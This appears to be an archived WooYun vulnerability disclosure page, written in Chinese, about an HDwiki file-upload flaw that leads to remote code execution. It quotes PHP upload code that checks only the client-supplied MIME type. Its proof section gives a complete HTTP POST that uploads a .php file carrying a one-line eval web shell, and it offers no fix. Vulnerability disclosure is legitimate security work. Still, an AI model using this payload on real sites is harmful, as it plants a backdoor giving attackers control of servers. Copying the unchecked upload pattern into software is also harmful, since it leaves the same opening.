@@ -1,0 +1,221 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		HDwiki文件上传导致远程代码执行漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		HDwiki文件上传导致远程代码执行漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/路人甲">路人甲</a> 
+</li><li>提交时间：		2011-08-23 13:26</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-08-23：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-09-10：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">互动维客开源系统（HDwiki）作为中国第一家拥有自主知识产权的中文维基（Wiki）系统，由互动在线（北京）科技有限公司于2006 年11月28日正式推出，力争为给国内外众多的维基（Wiki）爱好者提供一个免费、易用、功能强大的维基（Wiki）建站系统。HDwiki的推出，填补了中文维基（Wiki）建站系统的空白<br />
+<br />
+但是HDwiki中某些上传功能存在安全漏洞，通过一些数据即可绕过上传限制，最终控制远程站点</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">lib/file.class.php中<br />
+<br />
+</p><pre><code>function uploadfile($attachment,$target,$maxsize=1024,$is_image=1){<br />
+		$result=array (&#039;result&#039;=&gt;false,&#039;msg&#039;=&gt;&#039;upload mistake&#039;);<br />
+		if($is_image){<br />
+			$attach=$attachment;<br />
+			$filesize=$attach[&#039;size&#039;]/1024;<br />
+			if(0==$filesize){<br />
+				$result[&#039;msg&#039;] = &#039;&amp;#19978;&amp;#20256;&amp;#38169;&amp;#35823;&#039;;<br />
+				return $result;<br />
+			}<br />
+			if(substr($attach[&#039;type&#039;],0,6)!=&#039;image/&#039;){<br />
+				$result[&#039;msg&#039;] =&#039;&amp;#26684;&amp;#24335;&amp;#38169;&amp;#35823;&#039;;<br />
+				return $result;<br />
+			}<br />
+			if($filesize&gt;$maxsize){<br />
+				$result[&#039;msg&#039;] =&#039;&amp;#25991;&amp;#20214;&amp;#36807;&amp;#22823;&#039;;<br />
+				return $result;<br />
+			}<br />
+		}else{<br />
+			$attach[&#039;tmp_name&#039;]=$attachment;<br />
+		}<br />
+		$filedir=dirname($target);<br />
+		file::forcemkdir($filedir);<br />
+		if(@copy($attach[&#039;tmp_name&#039;],$target) || @move_uploaded_file($attach[&#039;tmp_name&#039;],$target)){</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+没有什么检查<br />
+<br />
+<br />
+<br />
+attachment.php里触发<br />
+<br />
+</p><pre><code>function douploadimg() {<br />
+		$imgname=$_FILES[&#039;photofile&#039;][&#039;name&#039;];<br />
+		$extname=file::extname($imgname);<br />
+		$destfile=$_ENV[&#039;attachment&#039;]-&gt;makepath($extname);<br />
+		$arrupload=file::uploadfile($_FILES[&#039;photofile&#039;],$destfile);</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>POST /hdwiki/index.php?attachment-uploadimg HTTP/1.1<br />
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*<br />
+Referer: http://www.wooyun.org/<br />
+Accept-Language: zh-cn<br />
+Content-Type: multipart/form-data; boundary=---------------------------7db261e100f2e<br />
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; InfoPath.2)<br />
+Host: www.wooyun.org<br />
+Content-Length: 370<br />
+Connection: Keep-Alive<br />
+Cache-Control: no-cache<br />
+Cookie: Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1298002704449; hd_sid=raG13H; hd_auth=4113YBBXXB13XtdR6EXTA1Cb9BuhZMK%2F29wdoHDQJTV5QZOoYd62OHd46iXKqf4Qz%2F5gc6pLm9fZ%2Bdgv68MT; hd_searchtime=1300983373<br />
+<br />
+-----------------------------7db261e100f2e<br />
+Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;<br />
+<br />
+30000<br />
+-----------------------------7db261e100f2e<br />
+Content-Disposition: form-data; name=&quot;photofile&quot;; filename=&quot;C:\fucker\z.php&quot;<br />
+Content-Type: image/image<br />
+<br />
+zzz&lt;?eval($_REQUEST[z])?&gt;<br />
+-----------------------------7db261e100f2e--</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">额 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/路人甲" title="路人甲">路人甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-02706" title="HDwiki文件上传导致远程代码执行漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2011-08-23 13:26</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：12 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="2706";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
